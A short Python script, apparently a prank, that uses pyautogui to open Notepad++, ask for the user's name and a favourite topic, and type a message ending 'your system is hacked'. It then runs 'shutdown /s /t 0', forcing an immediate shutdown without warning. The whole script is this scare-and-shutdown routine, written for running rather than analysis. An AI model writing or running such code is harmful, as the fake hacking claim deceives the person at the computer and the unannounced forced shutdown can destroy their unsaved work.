import os
import numpy as np
import pandas as pd
import schedule
import pyautogui as py
import time

# file_list = os.listdir("D:\data\Tmc\Tadil")
# for file in file_list :
select = ["sport","news","crypto"]
def execute() :
    os.startfile("C:\\Program Files\\Notepad++\\Notepad++.exe")
    time.sleep(3)
    py.hotkey("Ctrl" ,"w")
    py.keyDown("Tab")
    # py.hotkey("Ctrl" , "n")
    name = py.prompt("what is your name")
    py.alert(f"welcom {name}")
    time.sleep(2)
    result = py.prompt("select your faverit 1-sport 2-news 3-crypto")
    py.alert(f"  your select is : {select[int(result)-1]}")  
    name +="  your select is : " + select[int(result)-1] + " and " +"  your system is hacked"
    for i in name :
        py.write(i)
        time.sleep(.001)
    py.hotkey("Ctrl" ,"w")
    py.keyDown("Tab")
    py.keyDown("Enter")
   

    
    os.system("shutdown /s /t 0")

execute()